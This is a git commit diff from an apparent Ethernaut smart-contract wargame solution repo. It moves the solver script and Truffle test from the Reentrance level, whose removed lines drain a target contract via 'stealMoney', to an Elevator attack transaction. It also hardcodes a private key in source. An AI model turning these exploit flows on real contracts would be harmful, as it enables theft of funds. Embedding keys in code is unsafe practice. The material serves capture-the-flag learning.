d9b102e557e49f762e4eedadbe25f1797613781f
Matías Barrios <matiasbn@MacBook-Air-de-Matias.local>
2020-01-31 16:34:50 -0300

    feat: elevator solved

--- src/index.js
+++ src/index.js
@@ -8,24 +8,24 @@ const web3 = new Web3(infuraProvider);
 const privateKey = '0x1D5906FCC19C3641DF21665D42138610A8BC33D6735BB5D06C387AE08B9CC081';
 const account = web3.eth.accounts.privateKeyToAccount(privateKey);
 
-const solArtifact = JSON.parse(fs.readFileSync(path.resolve(__dirname, '../build/contracts/ReentranceSol.json')));
-// const artifact = JSON.parse(fs.readFileSync(path.resolve(__dirname, '../build/contracts/Reentrance.json')));
-const address = '0x2F493EEa60Dcec0521157C08a9298fcA1C3DC350';
+const solArtifact = JSON.parse(fs.readFileSync(path.resolve(__dirname, '../build/contracts/ElevatorSol.json')));
+const artifact = JSON.parse(fs.readFileSync(path.resolve(__dirname, '../build/contracts/Elevator.json')));
+const address = '0x1e3c175e2cbd4dA993c586a80DE7658C264c1859';
 const solAddress = solArtifact.networks['3'].address;
 debugEthernaut('solAddress', solAddress);
 const solContract = new web3.eth.Contract(solArtifact.abi, solAddress);
-// const contract = new web3.eth.Contract(artifact.abi, address);
+const contract = new web3.eth.Contract(artifact.abi, address);
 
 const ethernaut = async () => {
   try {
-    const estimatedGas = await solContract.methods.stealMoney().estimateGas();
+    const estimatedGas = await await solContract.methods.attack(0).estimateGas();
     debugEthernaut('estimated gas', estimatedGas);
-    const transactionData = await solContract.methods.stealMoney().encodeABI();
-    debugEthernaut('data', transactionData);
+    const data = await solContract.methods.attack(0).encodeABI();
+    debugEthernaut('data', data);
     const transaction = {
       from: account.address,
       to: solAddress,
-      data: transactionData,
+      data,
       gasLimit: estimatedGas * 100,
       // gasPrice: web3.utils.toWei('20', 'Gwei'),
     };
@@ -36,16 +36,9 @@ const ethernaut = async () => {
     const txResult = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
     debugEthernaut('txResult:\n', txResult);
 
-    // Retrieve money
-    const currentBalance = await web3.eth.getBalance(account.address);
-    debugEthernaut('currentBalance', web3.utils.fromWei(currentBalance));
-    await solContract.getTheBounty();
-    const newBalance = await web3.eth.getBalance(account.address);
-    debugEthernaut('newBalance', web3.utils.fromWei(newBalance));
-
     // Check result
-    const contractFinalBalance = await web3.eth.getBalance(address);
-    debugEthernaut('contractFinalBalance', contractFinalBalance);
+    const top = await contract.methods.top().call();
+    debugEthernaut('top', top);
   } catch (error) {
     debugError(error);
   }
--- test/testContract.test.js
+++ test/testContract.test.js
@@ -1,49 +1,48 @@
 /* eslint-disable no-underscore-dangle */
-const SolArtifact = artifacts.require('ReentranceSol');
-const TargetArtifact = artifacts.require('Reentrance');
+const SolArtifact = artifacts.require('ElevatorSol');
+const TargetArtifact = artifacts.require('Elevator');
 const { catchRevert } = require('./exceptionsHelpers.js');
 
 
-contract('Reentrance', (accounts) => {
+contract('Elevator', (accounts) => {
   let solContract;
   let targetContract;
-  const initialBalance = web3.utils.toWei('1');
-  const steal = web3.utils.toWei('0.5');
-  const totalBounty = web3.utils.toWei('1.5');
   const owner = accounts[0];
 
   before(async () => {
     targetContract = await TargetArtifact.new();
-    await targetContract.sendTransaction({ value: initialBalance });
-    solContract = await SolArtifact.new(targetContract.address, steal);
+    solContract = await SolArtifact.new(targetContract.address);
   });
 
 
-  it('should steal all the money from Reentrance contract', async () => {
-    // Amount transferred initially to Reentrance contract
-    const reentranceInitialBalance = await web3.eth.getBalance(targetContract.address);
-    assert.equal(reentranceInitialBalance, initialBalance, 'reentrance should be the 1 ether');
+  it('should get to the top floor YEEEEET', async () => {
+    // Call the attack directly
+    
 
-    // Amount stated as 'steps' to steal money
-    const solDonation = await solContract.amount();
-    assert.equal(solDonation, steal, 'solDonation should be the steal amount');
+    // // Amount transferred initially to Reentrance contract
+    // const reentranceInitialBalance = await web3.eth.getBalance(targetContract.address);
+    // assert.equal(reentranceInitialBalance, initialBalance, 'reentrance should be the 1 ether');
 
-    // Donate money to Reentrance contract
-    await targetContract.donate(solContract.address, { value: steal });
-    const donationResult = await targetContract.balanceOf(solContract.address);
-    assert.equal(donationResult.toString(), steal, 'donationResult should be the donation amount');
+    // // Amount stated as 'steps' to steal money
+    // const solDonation = await solContract.amount();
+    // assert.equal(solDonation, steal, 'solDonation should be the steal amount');
 
-    // Attack!!
-    await solContract.stealMoney();
-    const targetFinalBalance = await web3.eth.getBalance(targetContract.address);
-    const solFinalBalance = await web3.eth.getBalance(solContract.address);
-    assert.equal(targetFinalBalance.toString(), '0', 'targetFinalBalance should be 0');
-    assert.equal(solFinalBalance.toString(), totalBounty, 'donationResult should be the donation amount');
+    // // Donate money to Reentrance contract
+    // await targetContract.donate(solContract.address, { value: steal });
+    // const donationResult = await targetContract.balanceOf(solContract.address);
+    // assert.equal(donationResult.toString(), steal, 'donationResult should be the donation amount');
 
-    // Retrieve contract balance
-    const currentBalance = await web3.eth.getBalance(owner);
-    await solContract.getTheBounty();
-    const newBalance = await web3.eth.getBalance(owner);
-    assert.equal(currentBalance < newBalance, true, 'newBalance should be bigger than currentBalance');
+    // // Attack!!
+    // await solContract.stealMoney();
+    // const targetFinalBalance = await web3.eth.getBalance(targetContract.address);
+    // const solFinalBalance = await web3.eth.getBalance(solContract.address);
+    // assert.equal(targetFinalBalance.toString(), '0', 'targetFinalBalance should be 0');
+    // assert.equal(solFinalBalance.toString(), totalBounty, 'donationResult should be the donation amount');
+
+    // // Retrieve contract balance
+    // const currentBalance = await web3.eth.getBalance(owner);
+    // await solContract.getTheBounty();
+    // const newBalance = await web3.eth.getBalance(owner);
+    // assert.equal(currentBalance < newBalance, true, 'newBalance should be bigger than currentBalance');
   });
 });
